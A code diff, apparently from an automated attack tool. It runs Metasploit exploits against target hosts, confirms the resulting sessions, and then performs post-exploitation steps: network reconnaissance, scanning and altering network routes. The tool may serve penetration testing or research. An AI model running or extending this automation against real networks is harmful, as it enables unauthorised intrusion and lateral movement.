@@ -145,7 +145,8 @@ def main():
                 logger.info("Attempting exploit {} against host".format(exploit))
                 try:
                     exploitResults = Exploiter.callExploit(msfClient, exploit, targetIp, localIp)
-                    exploitSuccess = exploitResults["job_id"] != None
+                    msfSession = Exploiter.getSessionbyExploitUUID()
+                    exploitSuccess = msfSession != None
                 except Exception:
                     logger.info("Exploit {} failed abnormally.".format(exploit))
                     # traceback.print_exc()
@@ -154,6 +155,9 @@ def main():
                 if exploitSuccess:
                     break
 
+            # experiment
+            print(exploit)
+
             if not exploitSuccess:
                 logger.info("Failed to exploit host at IP {}".format(targetIp))
                 hostRecord.exploitStatus["statusCode"] = Record.STATUS_FAILURE
@@ -161,10 +165,10 @@ def main():
                 logger.info("Successfully exploited host at IP {}".format(targetIp))
                 hostRecord.exploitStatus = {
                     "statusCode": Record.STATUS_SUCCESS,
-                    "exploitUsed": exploitResults["uuid"], # TODO nab exploit name too/instead
-                    "msSessionId": exploitResults["job_id"]
+                    "exploitUsed": exploitResults["uuid"], #exploit
+                    "msfSessionId": msfSession["uuid"]
                 }
-            # TODO make sure this update works
+
             netMapTable.update(
                 {'_id': hostRecord.id},
                 {'$set':
@@ -185,11 +189,11 @@ def main():
         logger.info("Postexploiting...")
         while len(postexQueue) > 0:
             hostRecord = postexQueue.pop()
-            sessionDbg = {"IP": hostRecord.interfaces, "UUID": hostRecord.exploitStatus["exploitUsed"], "Session ID":hostRecord.exploitStatus["msSessionId"]}
+            sessionDbg = {"IP": hostRecord.interfaces, "Exploit Used": hostRecord.exploitStatus["exploitUsed"], "Session ID":hostRecord.exploitStatus["msfSessionId"]}
             logger.info(sessionDbg)
 
             for postExploitAction in ["remote_host_netinfo", "remote_host_scan", "alter_network_routes"]:
-                results = Exploiter.callPostExploit(msfClient, postExploitAction, hostRecord.exploitStatus["msSessionId"])
+                results = Exploiter.callPostExploitByUUID(msfClient, postExploitAction, hostRecord.exploitStatus["msfSessionId"])
                 logger.info("{}: {}".format(postExploitAction, results))
                 # if err == 0:
                 #     logger.info("{}: {}".format(postExploitAction, results))
@@ -200,12 +204,12 @@ def main():
 
 
 
-        ### repetition
+        ### end of cycle
         # identifiers should be rerun periodically to identify new hosts
         # alternative: run once, and restore state from DB info on startup
         logger.info("Reached end of cycle.")
         # TODO save exploiter weights to database
-        # TODO organize data for reports/next cycle
+        # TODO save a report (if no new data?)
         if len(enrichQueue) == 0:
             logger.info("Nothing new to scan. Sleeping.")
             time.sleep(60)
